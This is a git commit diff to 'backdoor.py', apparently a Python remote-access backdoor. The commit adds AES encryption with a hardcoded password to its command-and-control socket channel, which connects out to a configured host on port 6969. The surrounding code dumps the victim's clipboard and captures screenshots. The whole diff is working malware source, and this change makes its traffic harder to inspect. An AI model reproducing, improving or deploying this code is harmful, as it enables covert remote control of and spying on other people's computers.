5373e772d3c6172148b30dddd9b31895b977ec7a
7h3w4kl3r <61451071+7h3w4lk3r@users.noreply.github.com>
2020-09-26 02:35:43 +0330

    enhamced AES encryption

--- backdoor.py
+++ backdoor.py
@@ -1,7 +1,23 @@
 #!/usr/bin/python
-import subprocess, socket, json, os, base64, shutil, sys, platform, ctypes,pyperclip
+import ctypes
+import os
+import platform
+import pyperclip
+import shutil
+import subprocess
+import json
+import sys
+import base64
+import hashlib
+import socket
+from Crypto import Random
+from Crypto.Cipher import AES
 from mss import mss
-global ip,port,TMP,APPDATA,path,os_type,red,yellow,r
+
+global ip,port,TMP,APPDATA,path,os_type,red,yellow,r,password
+
+# AES channel password..............
+password="djknBDS89dHFS(*HFSD())"
 
 
 # color codes..................
@@ -9,9 +25,13 @@ red="\033[1;32;31m"
 yellow="\033[1;32;33m"
 r="\x1b[0m"
 
-dns = '192.168.56.1'
+dns = '0.0.0.0'
 ip = socket.gethostbyname(dns)
 port = 6969
+
+
+
+
 
 # detect OS type for future use........................
 if "Linux" in platform.uname():
@@ -41,6 +61,33 @@ try:
 except:
     pass
 
+
+# AES encryption/decryption.....................................................
+class AESCipher(object):
+    def __init__(self, key):
+        self.bs = AES.block_size
+        self.key = hashlib.sha256(key.encode()).digest()
+
+    def encrypt(self, raw):
+        raw = self._pad(raw)
+        iv = Random.new().read(AES.block_size)
+        cipher = AES.new(self.key, AES.MODE_CBC, iv)
+        return base64.b64encode(iv + cipher.encrypt(raw.encode()))
+
+    def decrypt(self, enc):
+        enc = base64.b64decode(enc)
+        iv = enc[:AES.block_size]
+        cipher = AES.new(self.key, AES.MODE_CBC, iv)
+        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')
+
+    def _pad(self, s):
+        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)
+
+    @staticmethod
+    def _unpad(s):
+        return s[:-ord(s[len(s)-1:])]
+
+
 # main backdoor class and functions..............................................
 class Backdoor:
     def __init__(self, ip, port):
@@ -54,24 +101,25 @@ class Backdoor:
             except socket.error:
                 continue
 
+    def encrypt(self,message):
+        encrypted = AESCipher(password).encrypt(message)
+        return encrypted
+
+    def decrypt(self, message):
+        decrypted = AESCipher(password).decrypt(message)
+        return decrypted
+
     def json_send(self, data):
-        try:
-            json_data = json.dumps(data)
-            return self.conn.send(json_data)
-        except:
-            return self.conn.send("[-] STDOUT parsing problem [-]")
-            pass
+        json_data = json.dumps(data)
+        return self.conn.send(self.encrypt(json_data))
+
 
     def receive(self):
         json_data = ""
         while True:
-            try:
-                json_data = json_data + self.conn.recv(4096)
-                return json.loads(json_data)
-            except ValueError:
-                continue
-            except:
-                pass
+            json_data = json_data + self.decrypt(self.conn.recv(4096))
+            return json.loads(json_data)
+
 
     # dump clipboard..................
     def clipboard(self):
